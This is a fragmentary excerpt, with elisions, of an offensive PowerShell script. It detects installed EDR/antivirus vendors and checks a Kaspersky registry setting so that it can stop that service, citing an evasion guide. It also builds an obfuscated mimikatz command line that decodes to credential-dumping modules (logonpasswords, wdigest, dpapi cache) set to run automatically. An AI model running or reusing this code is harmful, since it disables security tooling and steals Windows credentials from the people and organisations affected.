...
If($ManyCats.IsPresent)
{
   ...
   ForEach($Item in $EDRvendors)
   {
      ...
      If($Testme -iMatch "$Item")
      {
         ...
         If($Item -Match 'kaspersky')
         {
            ## Automatic stop kaspersky service if available
            # https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/kis-kes
            If((Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\KasperskyLab\protected\KES\settings" -Name "AllowServiceStop").AllowServiceStop -eq '1')
            {
   ...
   Else
   {
      ...
      Else
      {
         If($Module -iMatch '^(auto)$')
         {
            ## Remark: This cmdline can not contain more than 5 commands?
            $Sting = "ne%t:@:gro@up dp@ap%i:%:ca@ch%e t%s:@:log%onpa@ssw%o@rds sek%url@sa:@:wd@ig%est ex@it"
            $AutomaticExecution = $Sting -replace '%','' -replace '@',''
